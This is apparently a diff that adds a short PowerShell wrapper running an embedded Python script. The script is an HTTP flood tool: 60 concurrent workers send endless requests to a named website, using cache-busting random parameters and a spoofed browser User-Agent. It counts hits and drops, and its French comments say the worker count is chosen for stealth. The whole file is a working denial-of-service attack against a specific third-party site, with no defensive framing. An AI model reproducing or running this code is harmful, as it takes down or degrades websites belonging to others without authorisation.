@@ -1,0 +1,19 @@
+$code = @'
+import asyncio, aiohttp, random
+async def a():
+    h=d=0
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
+    async with aiohttp.ClientSession(headers=headers) as s:
+        while True:
+            try:
+                # Timeout monté à 2.0 pour stabiliser la connexion
+                async with s.get("https://kodingschools.com/", params={"v":random.random()}, timeout=2.0) as r:
+                    if r.status == 200: h += 1
+                    else: d += 1
+            except: d += 1
+            print(f"\rHITS: {h} | DROPS: {d}", end="", flush=True)
+async def m(): await asyncio.gather(*[a() for _ in range(60)]) # 60 workers pour plus de discrétion
+asyncio.run(m())
+'@
+ 
+python3 -c $code
